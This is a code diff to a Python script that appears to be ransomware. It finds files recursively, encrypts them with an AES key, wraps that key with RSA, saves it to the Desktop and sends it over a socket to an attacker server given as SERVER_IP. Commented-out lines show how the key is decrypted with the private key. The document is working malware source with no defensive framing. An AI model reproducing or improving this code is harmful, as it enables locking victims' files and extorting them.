@@ -41,9 +41,9 @@ def find_all_encrypted_files():
     txt_files = glob.glob('**/*.encrypted', recursive=True)
     return txt_files
 
-def save_key(key):
+def save_key(key, file_name='Key.key'):
     desktop_path = os.path.expanduser("~/Desktop")
-    file_path = os.path.join(desktop_path, 'Key.key')
+    file_path = os.path.join(desktop_path, file_name)
     with open(file_path, 'wb') as f:
         f.write(key)
 
@@ -60,23 +60,27 @@ def save_RSA_keys(public_key, private_key):
         f.write(b"\n")
         f.write(private_key)
 
-
-
 def encrypt_using_public(public_key, message):
     pk = RSA.import_key(public_key)
     cipher = PKCS1_OAEP.new(pk)
     ciphertext = cipher.encrypt(message)
     return ciphertext
+
 def decrypt_using_private(private_key, ciphertext):
     pvk = RSA.import_key(private_key)
     cipher = PKCS1_OAEP.new(pvk)
     plaintext = cipher.decrypt(ciphertext)
     return plaintext
+def read_key(file_name='Key.key'):
+    desktop_path = os.path.expanduser("~/Desktop")
+    file_path = os.path.join(desktop_path, file_name)
+    with open(file_path, 'rb') as f:
+        key = f.read()
+    return key
 
 
 key = generate_key(16)
 bytes_key = key.encode('utf-8')
-
 
 
 txt_files = find_all_files()
@@ -93,6 +97,10 @@ encrypted_files = find_all_encrypted_files()
 
 encrypted_key = encrypt_using_public(public_key=public_key, message=bytes_key)
 
+#save encrypted key to desktop
+save_key(encrypted_key,'encryptedKey.key')
+print(encrypted_key)
+print(read_key('encryptedKey.key'))
 #plaintext = decrypt_using_private(private_key=private_key, ciphertext=encrypted_key)
 #print (plaintext)
 
@@ -103,7 +111,12 @@ with socket.socket(socket.AF_INET , socket.SOCK_STREAM) as s:
      s.connect((SERVER_IP, SERVER_PORT))
      data = s.recv(1024)
      print(data)
-     s.send(bytes_key)
-input()
+     s.send(encrypted_key)
+#input() For inputing
 
-
+#Note: the following is needed in order to decrypt the AES key
+#bytes_decrypted_key = decrypt_using_private(private_key=private_key, ciphertext=encrypted_key)
+#AES_key = bytes_decrypted_key.decode('utf-8')
+#print(key)
+#print(AES_key)
+#print(key==AES_key)
